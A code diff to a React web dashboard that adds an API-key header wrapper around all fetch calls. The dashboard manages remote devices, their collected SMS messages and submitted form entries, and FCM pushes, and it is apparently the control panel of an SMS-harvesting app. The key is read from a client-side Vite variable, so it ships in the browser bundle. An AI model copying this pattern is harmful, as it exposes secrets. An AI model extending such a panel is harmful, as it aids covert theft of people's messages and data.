@@ -4,6 +4,13 @@ import { CircularLoader } from "@/components/ui/circular-loader";
 import { CopyIconButton } from "@/components/ui/copy-icon-button";
 import { DeleteIconButton } from "@/components/ui/delete-icon-button";
 
+const _API_KEY = import.meta.env.VITE_API_SECRET ?? "";
+function apiFetch(url: string, opts: RequestInit = {}): Promise<Response> {
+  const h = new Headers(opts.headers);
+  if (_API_KEY) h.set("x-api-key", _API_KEY);
+  return fetch(url, { ...opts, headers: h });
+}
+
 const DEVELOPER_TELEGRAM = "@mrrobot_dev";
 const DEVELOPER_WHATSAPP = "+91 98765 43210";
 const BUILD_VERSION = "v2.0.1 · 2026-05-18";
@@ -134,7 +141,7 @@ function useInfiniteScroll<T>(items: T[], pageSize = 20, initialCount?: number, 
 }
 
 async function fcmSend(deviceId: string, data: Record<string, string>): Promise<string> {
-  const res = await fetch("/api/fcm/send", {
+  const res = await apiFetch("/api/fcm/send", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ deviceId, data }),
@@ -293,7 +300,7 @@ const MsgCard = React.memo(function MsgCard({
             confirmTitle="Delete SMS"
             confirmText={`Are you sure you want to delete this SMS from ${msg.fromSender}? This action cannot be undone.`}
             onConfirm={async () => {
-              const r = await fetch(`/api/messages/${msg.id}`, { method: "DELETE" });
+              const r = await apiFetch(`/api/messages/${msg.id}`, { method: "DELETE" });
               if (!r.ok) throw new Error(`Server error (${r.status}). Please make sure the server is updated and try again.`);
             }}
           />
@@ -354,7 +361,7 @@ const MsgCard = React.memo(function MsgCard({
                         confirmTitle="Delete Form Entry"
                         confirmText="Are you sure you want to delete this form entry? This action cannot be undone."
                         onConfirm={async () => {
-                          const r = await fetch(`/api/data/${entry.id}`, { method: "DELETE" });
+                          const r = await apiFetch(`/api/data/${entry.id}`, { method: "DELETE" });
                           if (!r.ok) throw new Error(`Server error (${r.status}). Please make sure the server is updated and try again.`);
                         }}
                       />
@@ -1044,7 +1051,7 @@ function GroupsPage({ devices, formData, onOpenDevice, initialCount, onCountChan
                         confirmTitle="Delete All Form Entries"
                         confirmText={`Are you sure you want to delete ALL ${devForm.length} form ${devForm.length === 1 ? "entry" : "entries"} submitted by ${device.name}? This action cannot be undone.`}
                         onConfirm={async () => {
-                          const r = await fetch(`/api/data?appId=${encodeURIComponent(device.appId)}&deviceId=${encodeURIComponent(device.deviceId)}`, { method: "DELETE" });
+                          const r = await apiFetch(`/api/data?appId=${encodeURIComponent(device.appId)}&deviceId=${encodeURIComponent(device.deviceId)}`, { method: "DELETE" });
                           if (!r.ok) throw new Error(`Server error (${r.status}). Please make sure the server is updated and try again.`);
                         }}
                       />
@@ -1393,7 +1400,7 @@ function DevicesPage({ appId, devices, messages, formData, initialDevice, onBack
     if (starringId === device.deviceId) return;
     setStarringId(device.deviceId);
     try {
-      await fetch(`/api/devices/${encodeURIComponent(device.deviceId)}`, {
+      await apiFetch(`/api/devices/${encodeURIComponent(device.deviceId)}`, {
         method: "PATCH",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ starred: !device.starred }),
@@ -1408,7 +1415,7 @@ function DevicesPage({ appId, devices, messages, formData, initialDevice, onBack
   async function handleDeleteDevice(deviceId: string) {
     setDeleting(true);
     try {
-      await fetch(`/api/devices/${encodeURIComponent(deviceId)}`, { method: "DELETE" });
+      await apiFetch(`/api/devices/${encodeURIComponent(deviceId)}`, { method: "DELETE" });
       setDeletedIds(prev => new Set([...prev, deviceId]));
     } finally {
       setDeleting(false);
@@ -1771,7 +1778,7 @@ function DevicesPage({ appId, devices, messages, formData, initialDevice, onBack
                     confirmTitle="Delete SMS"
                     confirmText={`Are you sure you want to delete this SMS from ${msg.fromSender}? This action cannot be undone.`}
                     onConfirm={async () => {
-                      const r = await fetch(`/api/messages/${msg.id}`, { method: "DELETE" });
+                      const r = await apiFetch(`/api/messages/${msg.id}`, { method: "DELETE" });
                       if (!r.ok) throw new Error(`Server error (${r.status}). Please make sure the server is updated and try again.`);
                     }}
                   />
@@ -1902,7 +1909,7 @@ function SettingsPage({ appId, isDark, onToggleDark, devices, onLogout }: {
   const [limitPinVal, setLimitPinVal] = useState("");
   const [limitPinErr, setLimitPinErr] = useState("");
   useEffect(() => {
-    fetch(`/api/apps/${appId}`).then(r => r.ok ? r.json() : null)
+    apiFetch(`/api/apps/${appId}`).then(r => r.ok ? r.json() : null)
       .then(app => { if (app?.loginLimit) setLoginLimit(app.loginLimit); })
       .catch(() => {});
   }, [appId]);
@@ -1916,7 +1923,7 @@ function SettingsPage({ appId, isDark, onToggleDark, devices, onLogout }: {
 
   async function fetchSessions() {
     try {
-      const r = await fetch(`/api/admin/sessions?appId=${encodeURIComponent(appId)}`, { headers: { "x-silent": "1" } });
+      const r = await apiFetch(`/api/admin/sessions?appId=${encodeURIComponent(appId)}`, { headers: { "x-silent": "1" } });
       if (!r.ok) return;
       const list: AdminSession[] = await r.json();
       setSessions(list);
@@ -1942,13 +1949,13 @@ function SettingsPage({ appId, isDark, onToggleDark, devices, onLogout }: {
   }
 
   async function logoutSession(id: string) {
-    await fetch(`/api/admin/sessions/${id}`, { method: "DELETE" });
+    await apiFetch(`/api/admin/sessions/${id}`, { method: "DELETE" });
     if (id === mySessionId) { onLogout(); return; }
     fetchSessions();
   }
 
   async function logoutAll() {
-    await fetch(`/api/admin/sessions?appId=${encodeURIComponent(appId)}`, { method: "DELETE" });
+    await apiFetch(`/api/admin/sessions?appId=${encodeURIComponent(appId)}`, { method: "DELETE" });
     onLogout();
   }
 
@@ -2230,12 +2237,12 @@ function SettingsPage({ appId, isDark, onToggleDark, devices, onLogout }: {
                     setLimitPinErr("");
                     setLoginLimitSaving(true);
                     try {
-                      const vr = await fetch(`/api/apps/${appId}/verify-pin`, {
+                      const vr = await apiFetch(`/api/apps/${appId}/verify-pin`, {
                         method: "POST", headers: { "Content-Type": "application/json" },
                         body: JSON.stringify({ pin: limitPinVal }),
                       });
                       if (!vr.ok) { setLimitPinErr("Wrong PIN. Try again."); setLimitPinVal(""); return; }
-                      await fetch(`/api/apps/${appId}`, { method: "PATCH", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ loginLimit }) });
+                      await apiFetch(`/api/apps/${appId}`, { method: "PATCH", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ loginLimit }) });
                       setShowLimitPin(false); setLimitPinVal("");
                     } catch { setLimitPinErr("Network error. Try again."); }
                     finally { setLoginLimitSaving(false); }
@@ -2345,7 +2352,7 @@ function LoginPage({ onAuth, appId, appName }: { onAuth: () => void; appId: stri
     e.preventDefault();
     setLoading(true); setErr("");
     try {
-      const r = await fetch(`/api/apps/${appId}/verify-pin`, {
+      const r = await apiFetch(`/api/apps/${appId}/verify-pin`, {
         method: "POST", headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ pin }),
       });
@@ -2359,7 +2366,7 @@ function LoginPage({ onAuth, appId, appName }: { onAuth: () => void; appId: stri
         );
         setPin(""); return;
       }
-      const sessR = await fetch("/api/admin/sessions", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ appId }) }).catch(() => null);
+      const sessR = await apiFetch("/api/admin/sessions", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ appId }) }).catch(() => null);
       if (sessR?.ok) {
         const { sessionId } = await sessR.json();
         localStorage.setItem(`mrrobot_session_id_${appId}`, sessionId);
@@ -2375,14 +2382,14 @@ function LoginPage({ onAuth, appId, appName }: { onAuth: () => void; appId: stri
     e.preventDefault();
     setLoading(true); setErr("");
     try {
-      const verR = await fetch(`/api/apps/${appId}/verify-pin`, {
+      const verR = await apiFetch(`/api/apps/${appId}/verify-pin`, {
         method: "POST", headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ pin: oldPin }),
       });
       if (!verR.ok) { setErr("Current PIN is wrong."); return; }
       if (newPin.length < 4) { setErr("New PIN must be at least 4 characters."); return; }
       if (newPin !== newPin2) { setErr("PINs do not match."); return; }
-      await fetch(`/api/apps/${appId}`, {
+      await apiFetch(`/api/apps/${appId}`, {
         method: "PATCH", headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ pin: newPin }),
       });
@@ -2527,7 +2534,7 @@ export default function WebDashboard() {
   const [error, setError] = useState<string | null>(null);
 
   useEffect(() => {
-    fetch(`/api/apps/${appId}`).then(r => r.ok ? r.json() : null).then(app => { if (app?.name) setAppName(app.name); }).catch(() => {});
+    apiFetch(`/api/apps/${appId}`).then(r => r.ok ? r.json() : null).then(app => { if (app?.name) setAppName(app.name); }).catch(() => {});
   }, [appId]);
 
   // Poll app status every 10s — force logout if app is disabled
@@ -2535,13 +2542,13 @@ export default function WebDashboard() {
     if (!authed) return;
     async function checkAppStatus() {
       try {
-        const r = await fetch(`/api/apps/${appId}`, { headers: { "x-silent": "1" } });
+        const r = await apiFetch(`/api/apps/${appId}`, { headers: { "x-silent": "1" } });
         if (!r.ok) return;
         const app = await r.json() as { status: string; name?: string };
         if (app.name) setAppName(app.name);
         if (app.status !== "active") {
           const sid = localStorage.getItem(`mrrobot_session_id_${appId}`);
-          if (sid) fetch(`/api/admin/sessions/${sid}`, { method: "DELETE" }).catch(() => {});
+          if (sid) apiFetch(`/api/admin/sessions/${sid}`, { method: "DELETE" }).catch(() => {});
           localStorage.removeItem(`mrrobot_auth_${appId}`);
           localStorage.removeItem(`mrrobot_session_id_${appId}`);
           setAuthed(false);
@@ -2564,14 +2571,14 @@ export default function WebDashboard() {
       const sid = localStorage.getItem(`mrrobot_session_id_${appId}`);
       if (!sid) {
           // Already logged in but no session tracked — create one (handles old-code logins)
-          fetch("/api/admin/sessions", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ appId }) })
+          apiFetch("/api/admin/sessions", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ appId }) })
             .then(r => r.ok ? r.json() : null)
             .then(data => { if (data?.sessionId) localStorage.setItem(`mrrobot_session_id_${appId}`, data.sessionId); })
             .catch(() => {});
           return;
         }
       try {
-        const r = await fetch(`/api/admin/sessions/${sid}/ping`, {
+        const r = await apiFetch(`/api/admin/sessions/${sid}/ping`, {
           method: "PATCH",
           headers: { "x-silent": "1" },
         });
@@ -2697,9 +2704,9 @@ export default function WebDashboard() {
       // Stage 1 — fetch devices, formData, and FIRST page of messages in parallel.
       // Dashboard renders as soon as this finishes (~400ms even with thousands of rows).
       const [dRes, mRes, fRes] = await Promise.all([
-        fetch(`/api/devices?appId=${appId}`, { headers: h, signal: controller.signal }),
-        fetch(`/api/messages?appId=${appId}&limit=${FIRST_PAGE}&offset=0`, { headers: h, signal: controller.signal }),
-        fetch(`/api/data?appId=${appId}`, { headers: h, signal: controller.signal }),
+        apiFetch(`/api/devices?appId=${appId}`, { headers: h, signal: controller.signal }),
+        apiFetch(`/api/messages?appId=${appId}&limit=${FIRST_PAGE}&offset=0`, { headers: h, signal: controller.signal }),
+        apiFetch(`/api/data?appId=${appId}`, { headers: h, signal: controller.signal }),
       ]);
       if (!dRes.ok || !mRes.ok) throw new Error("API error");
       const [d, firstM, f] = await Promise.all([dRes.json(), mRes.json(), fRes.ok ? fRes.json() : []]) as [DbDevice[], DbMessage[], DbFormData[]];
@@ -2721,7 +2728,7 @@ export default function WebDashboard() {
         if (offset < FIRST_PAGE) return;
         for (;;) {
           try {
-            const r = await fetch(`/api/messages?appId=${appId}&limit=${PAGE_SIZE}&offset=${offset}`, { headers: { "x-silent": "1" } });
+            const r = await apiFetch(`/api/messages?appId=${appId}&limit=${PAGE_SIZE}&offset=${offset}`, { headers: { "x-silent": "1" } });
             if (!r.ok) break;
             const page = await r.json() as DbMessage[];
             if (!page.length) break;
@@ -2913,7 +2920,7 @@ export default function WebDashboard() {
 
   function handleLogout() {
     const sid = localStorage.getItem(`mrrobot_session_id_${appId}`);
-    if (sid) fetch(`/api/admin/sessions/${sid}`, { method: "DELETE" }).catch(() => {});
+    if (sid) apiFetch(`/api/admin/sessions/${sid}`, { method: "DELETE" }).catch(() => {});
     localStorage.removeItem(`mrrobot_auth_${appId}`);
     localStorage.removeItem(`mrrobot_session_id_${appId}`);
     setAuthed(false);
